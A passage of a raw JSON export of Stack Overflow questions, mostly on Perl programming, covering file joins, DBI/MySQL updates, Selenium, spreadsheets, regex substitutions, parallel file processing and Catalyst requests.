1:</p>\n\n<pre><code>12345|AA|BB|CC\n23456|DD|EE|FF\n</code></pre>\n\n<p>File Input2:</p>\n\n<pre><code>12345|A|B|C\n12345|D|E|F\n12345|G|H|I\n23456|J|K|L\n23456|M|N|O\n32342|P|Q|R\n</code></pre>\n\n<p>The reason I put those last one in is because the second file has a lot of values I donât want but file 1 I want all values.  The result I want is something like this:</p>\n\n<p>WANTED OUTPUT:</p>\n\n<pre><code>12345|AA|BB|CC|A|B|C\n12345|AA|BB|CC|D|E|F\n12345|AA|BB|CC|G|H|I\n23456|DD|EE|FF|J|K|L\n23456|DD|EE|FF|M|N|O\n</code></pre>\n\n<p>Attached is the code I am currently using.  It gives an output like so:</p>\n\n<p>OUTPUT I AM GETTING:</p>\n\n<pre><code>12345|AA|BB|CC|A|B|C\n23456|DD|EE|FF|J|K|L\n</code></pre>\n\n<p>My code so far:</p>\n\n<pre><code>#use strict; \n#use warnings; \n\nopen file1, \"&lt;FILE1.txt\"; \nopen file2, \"&lt;FILE2.txt\"; \n\nwhile(&lt;file2&gt;){\n\n    my($line) = $_; \n    chomp $line; \n    my($key, $value1, $value2, $value3) = $line =~ /(.+)\\|(.+)\\|(.+)\\|(.+)/; \n    $value4 = \"$value1|$value2|$value3\"; \n    $file2Hash{$key} = $value4; \n} \n\nwhile(&lt;file1&gt;){ \n\n    my ($line) = $_; \n    chomp $line; \n    my($key, $value1, $value2, $value3) = $line =~/(.+)\\|(.+)\\|(.+)\\|(.+)/; \n\n    if (exists $file2Hash{$key}) {\n\n        print $line.\"|\".$file2Hash{$key}.\"\\n\";\n    } \n    else {\n        print $line.\"\\n\";\n    } \n} \n</code></pre>\n\n<p>Thank you for any help you may provide,</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":146,"score":0,"question_id":12380528,"title":"Perl DBI mysql update","body":"<p>namekey       values\n .               .\n .               .\n .               .\nusername         to be updated</p>\n\n<pre><code>#!/usr/bin/perl -w\n# Use the DBI module\n\nuse  strict;\nuse warnings;\nuse DBI;\n\n# CONFIG VARIABLES\nmy $platform = \"mysql\";\nmy $database = \"prod\";\nmy $host     = \"localhost\";\nmy $username = \"root\";\nmy $password = \"admin\";\n\n# DATA SOURCE NAME\nmy $dsn = \"dbi:$platform:$database:$host\";\n\n# PERL DBI CONNECT\nmy $connect = DBI-&gt;connect($dsn, $username, $password);\n\n# VARS for Examples\nmy $query;\nmy $query_handle;\nmy $id;\nmy $demo;\n\n# Example 2 using do() UPDATE   \n\n# SAMPLE VARIABLE AND VALUES TO PASS INTO SQL STATEMENT\n$id   = \"username\";\n$name = \"Arty\";\n\n# do() THE UPDATE\n$query        = \"UPDATE jos_config SET values = '$name' WHERE namekey = $id;\";\n$query_handle = $connect-&gt;prepare($query);\n\n# EXECUTE THE UPDATE\n$query_handle = $connect-&gt;do($query);\n\nprint STDERR \"ERROR: $DBI::errstr\";\nprint STDERR \"INFO: $query_handle rows updated\";\n\nundef $query;\n</code></pre>\n\n<p>error message:   </p>\n\n<pre><code>DBD::mysql::db do failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'values = 'Arty' WHERE namekey = smtp_username' at line 1 at /home/arty/Documents/SmtpDbchange2.pl line 40.\nERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'values = 'Arty' WHERE namekey = smtp_username' at line 1Use of uninitialized value $query_handle in concatenation (.) or string at /home/arty/Documents/SmtpDbchange2.pl line 43.\n</code></pre>\n\n<p>please assist</p>\n"},{"tags":["perl","folder"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":80,"score":-1,"question_id":12379677,"title":"Moving files into different folders/directories based on their name","body":"<p>I have a directory or folder consisting of hundreds of files. They are named and arranged alphabatically. I want to move the files into directories or folders according to the first character of their name. Like filenames starting with \"a\" in one folder, \"r\" in one folder, etc.</p>\n\n<p>Is their a way to do it without using CPAN modules????</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12380286,"title":"Perl `$$` variable","body":"<p>What does the <code>$$</code> part mean in perl?</p>\n\n<p>I found it in this code snippet:</p>\n\n<pre><code>my $unique   = \"P$$\" . \"M$microseconds\";\n</code></pre>\n"},{"tags":["xml","perl","selenium-rc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12316065,"title":"Selenium RC Perl script how to get source of xml page?","body":"<p>I wrote a simple perl script with the WWW::Selenium module that interacts with the Selenium RC server and goes to a webpage and downloads the source. I am able to do this with HTML pages. However, I have an XML page I want to download the source of. This is obviously not possible with the 'get_source_html()' function. Below is the script of what i want to do:</p>\n\n<pre><code>#!/usr/bin/perl -sw\nuse WWW::Selenium;\n\nprint \"\\n setting up Selenium...\\n\";\nmy $sel = WWW::Selenium-&gt;new( host =&gt; \"localhost\",\nport =&gt; 4444,\nbrowser =&gt; \"*firefox\",\nbrowser_url =&gt; \"http://www.google.com\",\n);\n\nprint \" starting Selenium...\\n\";\n$sel-&gt;start;\n\n$sel-&gt;open('someXMLpage...');\n$sel-&gt;wait_for_page_to_load();\n\nmy $xml = $sel-&gt;get_html_source();\nprint $xml;\n</code></pre>\n\n<p>As you can see the get_html_source is obviously a problem since it will return an error saying that the page is not html. Is there some way that I can just download the current page visible in the browser regardless of the type of page(like the click 'view source' in firefox or even better: some get_source() function)? Also note, that the url I need to use does not end in something like a '.xml' file. The page is generated on the fly if that means anything...</p>\n\n<p>Any wisdom greatly appreciated!</p>\n"},{"tags":["linux","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12029053,"title":"Overwriting the existing Worksheet of a Excel File in Perl","body":"<p>With the reference to <a href=\"http://stackoverflow.com/questions/12026229/overwrite-the-existing-worksheet-in-perl\">the question I had asked before</a> is:</p>\n\n<p>My Code is as below:</p>\n\n<pre><code>        if ( !-e $xls_file ) #Checking whether to create a new Excel file or not\n        {\n                #if yes create a new excel file and 4 worksheets\n                print OUTFILE \"Creatin a new sheet.\\n\";\n                $excelFileHandle= Spreadsheet::WriteExcel-&gt;new($xls_file) ;\n                &amp;InitFormatting ($excelFileHandle);#For format of each cell.    \n                ($handle, $row, $col)    = &amp;AddSheet(\"$monthYearStr\", \"$SHEET_TITLE\", @ReportColLabels);\n                ($handle1, $row1, $col1) = &amp;AddSheet(\"$STATUS_CODE_SHEET_NAME\", \"$STATUS_CODE_SHEET_TITLE\", @Status_Code_labels);\n                ($handle2, $row2, $col2) = &amp;AddSheet(\"$SUCCESS_COUNT_SHEET_NAME\", \"$SUCCESS_SHEET_TITLE\", @Success_count_labels);\n                ($handle3, $row3, $col3) = &amp;AddSheet(\"$FAILURE_COUNT_SHEET_NAME\", \"$FAILURE_SHEET_TITLE\", @Failure_count_labels);\n                $new = 1;\n        }\n\n        else  #File exists needs to parsed and append the data.\n        {\n                print OUTFILE \"Opening the existing sheet.\\n\";\n                my $parser   = Spreadsheet::ParseExcel-&gt;new();\n                my $workbook = $parser-&gt;parse($xls_file);\n                if ( !defined $workbook )\n                {   \n                        die $parser-&gt;error(), \".\\n\";\n                }   \n                my $worksheet = $workbook-&gt;worksheet($monthYearStr);\n                ( $row_min, $row_max ) = $worksheet-&gt;row_range();\n                ( $col_min, $col_max ) = $worksheet-&gt;col_range();\n\n                my $worksheet1 = $workbook-&gt;worksheet($monthYearStr);\n                ( $row_min1, $row_max1 ) = $worksheet1-&gt;row_range();\n                ( $col_min1, $col_max1 ) = $worksheet1-&gt;col_range();\n\n                $new = 0;\n        }\n\n        if ( $new = 1 ) \n        {\n                $handle-&gt;write($row, $col++, \"$present_date\", $num_field_format);\n                ------Contiuned for remainin row and col for $monthYearStr $STATUS_CODE_SHEET_NAME $SUCCESS_COUNT_SHEET_NAME $FAILURE_COUNT_SHEET_NAME-------\n        }\n\n        elsif ( $new == 0)\n        {\n                ###Appending the data####\n\n                $parser   = Spreadsheet::ParseExcel::SaveParser-&gt;new();\n           $template = $parser-&gt;Parse($xls_file);\n            if ( ! defined $template )\n            {\n                    die $parser-&gt;error(), \".\\n\";\n            }\n\n            my $worksheet = $template-&gt;worksheet($monthYearStr);\n            my $row = $row_max + 1;\n\n            my $cell = $worksheet-&gt;get_cell( $row_max, $row_max );\n            my $format_number = $cell-&gt;{FormatNo};\n\n            $worksheet-&gt;AddCell($row, $col++, \"$present_date\", $format_number);\n            ---------Continued for remaining row and col only for $monthYearStr $STATUS_CODE_SHEET_NAME -----------------------------\n\n }\n</code></pre>\n\n<p>Now, how do I over-write the worksheet sheet success_count and failure_count each time when the excel file exists.\nPlease suggest me how to do this.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12379187,"title":"Ignoring part of an list in the output of a func. call in Perl","body":"<p>I would like to only capture part of a list output by a function in Perl. </p>\n\n<p>I thought something alone these lines would do it, but they don't.</p>\n\n<p>E.g. Capturing the last element of the list:</p>\n\n<pre><code>(, $my_var)  = split(/_/,$sample_string); \n</code></pre>\n\n<p>E.g. Capturing the second element of the list:</p>\n\n<pre><code>(, $my_var, , ,)  = split(/_/,$sample_string);\n</code></pre>\n\n<p>Is this possible in Perl?</p>\n"},{"tags":["perl","html-form","www-mechanize","lwp-useragent"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12378135,"title":"How to convert perl HTML::Form form into an html dump (WWW::Mechanize)","body":"<p>I have a form with filled in fields using HTML::Form :</p>\n\n<pre><code>$form-&gt;value($name =&gt; $value);\n</code></pre>\n\n<p>I can dump the status of the form using <code>$form-&gt;dump</code> and double check that what I edited is what is being sent.</p>\n\n<p>How can I convert the form object into an html dump? Not just a text dump!</p>\n\n<p>I would like to be able to replace the filled in hmtl chunck from the original html tree and save it.</p>\n\n<p>Unfortunately WWW::Mechanize doesn't have this feature.</p>\n"},{"tags":["perl","oop","class","object","methods"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":141,"score":2,"question_id":7011848,"title":"Perl: Assign Coderef to Method without Symbol Table Hacks","body":"<p>Building on from a previous query regarding Class::Struct vs Object::Accessor, I'd like to find the best way to assign package subs from coderefs in object constructors. Hey, I've got the OO attributes down, so lets get to the methods :)</p>\n\n<p>Note that I said 'best' way. I've already found two ways of doing it which also seem to be popular answers in similar questions, but they require circumventing strict and warnings respectively.</p>\n\n<p>Note that the example gives the class-user the ability to override the formatting method at construction. Poor example, but you get the idea. To preemptively rebut the OO-purists, this makes more sense in my particular design than making the class-user subclass it with their own overridden version.</p>\n\n<p>Here are my two attempts:</p>\n\n<pre><code>use 5.014;\nuse autodie;\nuse strict;\nuse warnings;\n\npackage Account {\n    use base 'Object::Accessor';\n\n    sub new {\n        my ($type, %args) = @_;\n\n        my $self = bless { }, $type;\n        $self-&gt;mk_accessors(qw(\n            first_name last_name age_in_years activated\n        ));\n\n        $self-&gt;first_name(  $args{first_name  } // 'Default First Name'  );\n        $self-&gt;last_name(   $args{last_name   } // 'Default Last Name'   );\n        $self-&gt;age_in_years($args{age_in_years} // 'Default Age in Years');\n        $self-&gt;activated(   $args{activated   } // 'Default Activated'   );\n\n        {\n            # Stop skim reading and look here!\n\n            no warnings 'once';\n            *formatted = $args{formatted} || sub {\n                return 'Default formatting routine';\n            };\n        }\n\n        return $self;\n    }\n}\n\nmy $account = Account-&gt;new;\nsay $account-&gt;formatted;\n\n# Output: Default formatting routine\n</code></pre>\n\n<p>And the other one:</p>\n\n<pre><code>use 5.014;\nuse autodie;\nuse strict;\nuse warnings;\n\npackage Account {\n    use base 'Object::Accessor';\n\n    sub new {\n        my ($type, %args) = @_;\n\n        my $self = bless { }, $type;\n        $self-&gt;mk_accessors(qw(\n            first_name last_name age_in_years activated\n        ));\n\n        $self-&gt;first_name(  $args{first_name  } // 'Default First Name'  );\n        $self-&gt;last_name(   $args{last_name   } // 'Default Last Name'   );\n        $self-&gt;age_in_years($args{age_in_years} // 'Default Age in Years');\n        $self-&gt;activated(   $args{activated   } // 'Default Activated'   );\n\n        {\n            # Stop skim reading and look here!\n\n            no strict 'refs';\n            *{'formatted'} = $args{formatted} || sub {\n                return 'Default formatting routine';\n            };\n        }\n\n        return $self;\n    }\n}\n\nmy $account = Account-&gt;new;\nsay $account-&gt;formatted;\n\n# Output: Default formatting routine\n</code></pre>\n\n<p>The former approach <strong>should</strong> work without warnings, but it doesn't because Perl thinks I'm not using it anywhere and flags it up as a warning at runtime. The latter doesn't work without circumventing strict, and that's how it should be :)</p>\n\n<p>All I'm doing is assigning a method to a user-supplied coderef. There should be an easy way of doing this.</p>\n\n<p>Note that defining a new sub that calls the user defined coderef doesn't work either, since the lexical %args can't be accessed from it.</p>\n\n<p>Whilst our assigns package variables, it can't do subs.</p>\n\n<p>Refraining the escape from the garden of strict and warnings, what is the cleanest way to do this? Hell, there's probably a way to do this using the Object::Accessor module that I just don't know about.</p>\n"},{"tags":["perl","compiler-errors","subroutine","required"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12358690,"title":"Is it possible in Perl to require a subroutine call is made?","body":"<p>I don't know enough about Perl to even know what I'm asking for exactly, but I'm writing a series of subroutines to be available for many individual scripts that all process different incoming flat files.  The process is far from perfect, but it's what I've got to deal with and I'm trying to build myself a small library of subs that make it easier for me to manage it all.  Each script handles a different incoming flat file with it's own formatting, sorting, grouping and outputting requirements. One common aspect is that we have small text files that house counters that are used to name the output files so that we have no duplicate file names.  </p>\n\n<p>Because the processing of the data is different for each file, I need to open the file to get my counter value, because this is a common operation, I'd like to put it in a sub to retrieve the counter.  But then need to write specific code to process the data.  And would like a second sub that allows me to update the counter with the counter once I've processed the data.  </p>\n\n<p>Is there a way to make the second sub call a requirement if the first one is called?  Ideally if it could even be an error that would prevent the script from running at all much like a syntax error.</p>\n\n<p>EDIT: Here is a little [ugly and simplified] psuedo-code to give a better feel for what the current process is:</p>\n\n<pre><code>require \"importLibrary.plx\";\n\n#open data source file\nopen DataIn, $filename;\n\n#call getCounterInfo from importLibrary.plx to get the counter value from counter file\n$counter = &amp;getCounterInfo($counterFileName);\n\nwhile (&lt;DataIn&gt;) {\n  #Process data based on unique formatting and requirements\n  #output to task files based on requirements and name files using the $counter\n  #increment $counter\n}\n\n#update counter file with new value of $counter\n&amp;updateCounterInfo($counter);\n</code></pre>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12376638,"title":"perl print file last modifed time","body":"<p>I have used the following method to print the file last modified time but the result the time printed on script has 2 hrs backward than the file stamp.</p>\n\n<pre><code>use File::stat;\nuse Time::localtime;\n\n$file = '/opt/test/time';\n$date = ctime(stat($file)-&gt;mtime);\nprint \"&lt;b&gt; $date &lt;/b&gt;\";\n</code></pre>\n\n<p>the time stamp on file name \"test\" is 12:30 pm but the script time display as 10:30 am.</p>\n\n<p>did i miss anything?</p>\n"},{"tags":["php","perl","apache","directory-listing","mod-autoindex"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1842,"score":0,"question_id":454776,"title":"Simple script to replace Apache's mod_autoindex with a user-friendly directory listing","body":"<p>The Apache module <a href=\"http://httpd.apache.org/docs/2.0/mod/mod_autoindex.html\" rel=\"nofollow\">mod_autoindex</a> generates \"directory indexes\" that show users a crude hyperlinked list of the files and directories inside a directory (when there is no index.html or other <a href=\"http://httpd.apache.org/docs/2.0/mod/mod_dir.html#directoryindex\" rel=\"nofollow\">DirectoryIndex</a> file).</p>\n\n<p>I have a directory on an Apache webserver where I want to provide an automatic directory listing, including the full filenames, sorted most-recently-modified-first, with file sizes displayed, using simple and attractive presentation. I cannot use mod_autoindex or other Apache features.</p>\n\n<p>I am therefore looking for a simple script that does much the same thing as mod_autoindex. In other words I want a script I can put in a directory that outputs an HTML document to STDOUT that contains a hyperlinked list of the files in the directory.</p>\n\n<p>The script should present its output in a simple &amp; attractive way (non-technical people will be using it), consist of one file that I can edit if required, and preferably be OS-independent (so I can use it again later). Extra features would be great, but ease of install is all-important (though I am happy to tweak the code if I have to).</p>\n\n<p>My preference is for a perl script (i.e. an index.pl file), but PHP would be acceptable  (index.php). Those are the only DirectoryIndex options on the server. </p>\n\n<p><strong>Update</strong></p>\n\n<p>I have decided to use <a href=\"http://www.bitfolge.de/snif-en.html\" rel=\"nofollow\">snif</a> in preference to <a href=\"http://autoindex.sourceforge.net/\" rel=\"nofollow\">AutoIndex</a> to solve the current problem, but I am still interested in finding a perl implementation, so if you know of one please post it. Thanks.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":109,"score":2,"question_id":12375030,"title":"process multiple files in parallel","body":"<p>I have a Perl script which reads two files and processes them. </p>\n\n<p>The first file - info file - I store it as a hash (3.5 gb)</p>\n\n<p>The second file - taregt file - I am processing by using information from the info file and other subroutines as designed. (This file, target, ranges from 30 - 60 gb)</p>\n\n<p>So far working are:</p>\n\n<ul>\n<li>reading the info file into a hash</li>\n<li>breaking the target file into\nchunks</li>\n</ul>\n\n<p>I want to run on all chunks in parallel:</p>\n\n<pre><code>while(chunks){\n    # do something \n\n    sub a {}\n    sub b {} \n} \n</code></pre>\n\n<p>So basically, I want to read a chunk, write its output and do this for multiple chunks at the same time. The while loop reads each line of a chunk file, and calls on various subroutine for processing. </p>\n\n<p>Is there a way that I can read chunks in background? </p>\n\n<p>I don't want to read info file for every chunk as it is 3.5gb long and I am reading it into hash, which takes up 3.5gb everytime. </p>\n\n<p>Right now the script takes 1 - 2hrs to run for 30-60gb.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12372443,"title":"Pause and Resume Perl Script based on Condition","body":"<p>I have written a Perl Script which connects to a set of URLs one by one. Each time it connects to a URL, it fetches the result and performs some operations on it.</p>\n\n<p>However, there are a few possibilities where an error might occur.</p>\n\n<p>The most important of these which I am trying to address is, availability issue. The Internet connection might stop working in between. So, lets say I have a list of 1000 URLs, the script has gone through 500 of them successfully and then Internet stops working, as a result, the script aborts with an error. I want to control this condition and implement a pause and resume feature here.</p>\n\n<p>A few lines of code to explain:</p>\n\n<pre><code>$mech=WWW::Mechanize-&gt;new();\n$mech-&gt;timeout(10);\n\n$url=\"http://example.com/index.php?id=\";\n\nwhile(&lt;INPUT&gt;)\n{\nchomp $_;\n$word=$_;\n$url=$url.$word;\neval{$mech-&gt;get($url);};\n\nif($@)\n{\n  # Pause the Script once the if condition evaluates to true\n}\n\n....\n\n}\n</code></pre>\n\n<p>There could be several conditions where I would want to pause the script.</p>\n\n<p>So, I understand that I need to pass some kind of signal to the script which would cause it to pause. At the same time, there should be a functionality provided to the end user, who can press \"some key combination\" to resume the script.</p>\n\n<p>My guess is that, this would involve some OS API Calls.</p>\n\n<p>On Linux, there is a way to suspend a process, by pressing Ctrl+Z key combination.</p>\n\n<p>However, I am not sure how this can be automated in the Perl Script.</p>\n\n<p>Please let me know if you need more details in order to find a solution to this.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","utility","use"],"answer_count":2,"favorite_count":3,"up_vote_count":15,"down_vote_count":0,"view_count":481,"score":15,"question_id":12286882,"title":"Is there a tool to check a Perl script for unnecessary use statements?","body":"<p>For Python, there is a script called <a href=\"http://pypi.python.org/pypi/importchecker\">importchecker</a> which tells you if you have unnecessary <code>import</code> statements.</p>\n\n<p>Is there a similar utility for Perl <code>use</code> (and <code>require</code>) statements?</p>\n"},{"tags":["java","regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":97,"score":1,"question_id":12355995,"title":"java regex with preceeding and trailing (.*) slow","body":"<p>I noticed that when I match a regular expression like the following one on a text it is a lot slower than the one without preceeding and trailing (<code>.*</code>) parts. I did the same on perl and found that for perl it hardly makes a difference. Is there any way to optimize the original regular expression <code>\"(.*)someRegex(.*)\"</code> for java?</p>\n\n<pre><code>Pattern p = Pattern.compile(\"(.*)someRegex(.*)\");\nMatcher m = p.matcher(\"some text\");\nm.matches();\n\nPattern p = Pattern.compile(\"someRegex\");\nMatcher m = p.matcher(\"some text\");\nm.matches();\n</code></pre>\n\n<p>Edit:\nHere is a concrete example:</p>\n\n<pre><code>(.*?)&lt;b&gt;\\s*([^&lt;]*)\\s*&lt;\\/b&gt;(.*)\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":71,"score":0,"question_id":12367640,"title":"Perl : how to apply two codes on csv file","body":"<p>I have many csv files that I need to clean ( replace ponctuation by space and replace certain words by others...) My csv files have two columns and in each one I replace some caracters by others. For exemple, in the first column I replace ; by xxx and in the second column I replace ; by ppp. To do that, I have two perl codes in regex and I slice one csv file on two files : file 1 = first column and file 2 = second column and I run the code for the first columns on the file of the first colums ....\nIt's not a good way at all :s !!!</p>\n\n<p>So how can I have one code in which the first condition run on the first column and the second condition on the second column of the SAME file ?</p>\n\n<p>CSV example :\n<a href=\"http://dbpedia.org/resource/Berenguer_de_Cru%C3%AFlles\" rel=\"nofollow\">http://dbpedia.org/resource/Berenguer_de_Cru%C3%AFlles</a>  Berenguer de CruÃ¯lles\n<a href=\"http://dbpedia.org/resource/Berenguer_de_Cru%C3%AFlles\" rel=\"nofollow\">http://dbpedia.org/resource/Berenguer_de_Cru%C3%AFlles</a>  Berenguer de CruÃ¯lles</p>\n\n<p>The IRI is the first column and the names are in the second one.</p>\n\n<p>Perl code in regex for the first column :</p>\n\n<pre><code>use strict;\nuse warnings;\n\nopen(IN,$ARGV[0]);\nopen(OUT,\"&gt;RES_xxx.txt\");\nwhile(my $l = &lt;IN&gt;)\n{\n chomp($l);\n     $l =~ s/http:\\/\\//_/g;\n     $l =~ s/,/vvv/g;\n     $l =~ s/\"/=/g;\n     $l =~ s/'/#/g;\n     $l =~ s/\\(/Ã©Ã©Ã©/g;\n     $l =~ s/\\)/Ã¨Ã¨Ã¨/g;\n     $l =~ s/%/zzz/g;\n\n     print OUT \"$l\\n\";\n}\nclose(IN);\nclose(OUT);\n</code></pre>\n\n<p>Perl code in regex for the second column :</p>\n\n<pre><code>   #! usr/bin/perl\n\n    use strict;\n    use warnings;\n\n    open(IN,$ARGV[0]);\n    open(OUT,\"&gt;RES_xxx.txt\");\n    while(my $l = &lt;IN&gt;)\n    {\n     chomp($l);\n     $l =~ s/\\(.+\\)/ /g;\n     $l =~ s/'/ /g;\n     $l =~ s/\"/ /g;\n     $l =~ s/,/ /g;\n     $l =~ s/\\./ /g;\n     $l =~ s/:/ /g;\n     $l =~ s/;/ /g;\n     $l =~ s/!/ /g;\n     $l =~ s/\\?/ /g;\n     $l =~ s/-/ /g;\n     $l =~ s/_/ /g;\n     $l =~ s/{/ /g;\n     $l =~ s/}/ /g;\n     $l =~ s/\\+/ /g;\n     $l =~ s/=/ /g;\n\n     print OUT \"$l\\n\";\n    }\n    close(IN);\n    close(OUT);\n</code></pre>\n\n<p>Thank you !</p>\n"},{"tags":["sql","perl","sybase"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":196,"score":0,"question_id":3462985,"title":"How do I get one row in the result set out of 2 rows in the table/file without using cursors in Sybase/Perl","body":"<p>I have a table T with columns A,B,C &amp; D as below:</p>\n\n<pre><code>A  B  C   D  \n===============\nA1 B1 USD LIBOR  \nA1 B2 JPY FIXED  \nA2 B3 USD LIBOR  \nA2 B4 EUR FIXED  \nA3 B5 JPY FIXED  \nA3 B6 USD LIBOR   \n</code></pre>\n\n<ol>\n<li><p>Table always has 2 rows per \"A\", with different values of \"B\".</p></li>\n<li><p>\"B\" is unique </p></li>\n<li><p>\"A\" - varchar(10), \"B\" - varchar(8), \"C\" - varchar(3), \"D\" - varchar(5)</p></li>\n<li><p>Validation rules restrict the columns to the below formats -\n\"A\", \"B', \"D\" - Alphanumeric\n\"C\" - Alphabetic</p></li>\n</ol>\n\n<p>I need to extract the below results from the table - </p>\n\n<p><strong>Result Set 1:</strong>  </p>\n\n<pre><code>A1 USD LIBOR JPY FIXED  \nA2 USD LIBOR EUR FIXED  \nA3 JPY FIXED USD LIBOR  \n</code></pre>\n\n<p><strong>Result Set 2:</strong>  </p>\n\n<pre><code>USD LIBOR JPY FIXED  \nUSD IBOR  EUR FIXED\n</code></pre>\n\n<p>I wish to avoid using cursors, unless there any other solution. </p>\n\n<p>Can I extract this table into a file and use perl to get the result ?  </p>\n\n<p>Please help ...</p>\n"},{"tags":["arrays","perl","hashes"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12370755,"title":"In Perl how to iterate over an array of hashes in an array of hashes","body":"<p>Lots of threads about iterating over an array of hashes, which I do daily. However now I want to iterate over an AoH in and AoH. I'm interested in the array \"chapters\" because I want to add a hash to each array element of that inner array:</p>\n\n<pre><code>$criteria = [\n    {\n      'title' =&gt; 'Focus on Learning',\n      'chapters' =&gt; [\n                          {\n                            'content_id' =&gt; '182',\n                            'criteria_id' =&gt; '1',\n                            'title' =&gt; 'Focus on Learning',\n                          },\n                          {\n                            'content_id' =&gt; '185',\n                            'criteria_id' =&gt; '1',\n                            'title' =&gt; 'Teachers Role',\n                          },\n                          {\n                            'content_id' =&gt; '184',\n                            'criteria_id' =&gt; '1',\n                            'title' =&gt; 'Parents in Class',\n                          },\n                          {\n                            'content_id' =&gt; '183',\n                            'criteria_id' =&gt; '1',\n                            'title' =&gt; 'Students at Home',\n                          }\n                        ],\n      'tot_chaps' =&gt; '4'\n    },\n</code></pre>\n\n<p>This, in theory, is want I want to do.</p>\n\n<pre><code>for my $i ( 0 .. $#$criteria ) {\n   for my $j ( 0 .. $#$criteria-&gt;[$i]{'chapters'}) {\n      print $criteria-&gt;[$i]{'chapters'}-&gt;[$j]{'title'}.\"\\n\";\n   }\n}\n\nprint $criteria-&gt;[$i]{'chapters'}-&gt;[1]{'title'}.\"\\n\"; -&gt; Teachers Role\n</code></pre>\n"},{"tags":["perl","asp-classic","crawling"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12368965,"title":"How to scrape a ASP website using perl?","body":"<p>Please tell me which module is used to scrape a website which is completely developed in ASP and all it's contents are not in proper HTML syntax.</p>\n"},{"tags":["mysql","perl","dbi","catalyst"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":166,"score":0,"question_id":7897247,"title":"How can I use \"ON DUPLICATE KEY UPDATE\" in Perl/Catalyst/DBI?","body":"<p>Maybe its too advanced for my apprentice level in Catalyst, but I need to port some functionality from the original system, and it is done using custom queries with the \"ON DUPLICATE KEY UPDATE\".</p>\n\n<p><strong>Can it be done using the Model/Schema/Result? Do I need to write my own FULL query?, how?</strong></p>\n\n<p><em>Here is the reason, just in case:</em></p>\n\n<ul>\n<li><em>The target table is a multilanguage and multiversion Preferences table with key/value pairs.</em></li>\n<li><em>I have 3 column indexes: theKey, theLang and theVersion.</em></li>\n<li><em>So, when I save theValue, it updates an existing row using those indexes, or create a new one if needed.</em></li>\n</ul>\n"},{"tags":["windows","perl","command-line","windows-xp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12368175,"title":"Why does Windows command prompt stall until a key is pressed when executing long batch files?","body":"<p>When I am running a long batch file,the command prompt hangs.\nBut,when press  enter,it continues without any problem.</p>\n\n<p>Why does this happen? And is there any way to keep this from happening?</p>\n"},{"tags":["regex","perl"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12369064,"title":"Replace multiple charcter using regex substitution","body":"<p>I am trying to perform a regex substitution on the output of acpi command. My perl one liner for this is:</p>\n\n<pre><code>acpi | perl -F/,/ -alne 'print $F[1] if ($F[1]=~s!\\s|%!!)'\n</code></pre>\n\n<p>The output of the above one liner is <code>87%</code> whereas my required output is just <code>87</code> so it is not replacing <code>%</code> in the string.</p>\n\n<p>Now the output of <code>acpi</code> command is </p>\n\n<pre><code>Battery 0: Discharging, 87%, 05:54:56 remaining\n</code></pre>\n\n<p>and the output of <code>print $F[1]</code> is</p>\n\n<pre><code>ronnie@ronnie:~$  acpi | perl -F/,/ -alne 'print $F[1]'\n 87%   #space followed by 87%#\nronnie@ronnie:~$ \n</code></pre>\n\n<p>Now the strange this is if I try the same perl one-liner on:</p>\n\n<pre><code>echo \" 86%\" | perl -nle 'print if s!\\s|%!!g'\n</code></pre>\n\n<p>It works fine and outputs <code>86</code>.</p>\n\n<p>So, why it is not working with acpi command.</p>\n\n<p>PS: I am aware this can be achieved by using sed/awk but I am interested why my solution is not working.</p>\n"},{"tags":["perl","catalyst"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":186,"score":2,"question_id":8480976,"title":"I have an ajax request and a test calling a Catalyst controller. How do I get the params to show up in the same place in the Catalyst object?","body":"<p>Snippet from the test:</p>\n\n<pre><code>my $request = HTTP::Request-&gt;new( POST =&gt; 'http://192.168.5.130:3000/user' );\n$request-&gt;content_type('application/json');\n$request-&gt;content( $query_string );\nmy $result = $ua-&gt;request( $request );\n</code></pre>\n\n<p>Snippet from the ajax call:</p>\n\n<pre><code>$.ajax({\n    url: 'http://192.168.5.130:3000/user',\n    type: 'POST',\n    cache: false,\n    async: 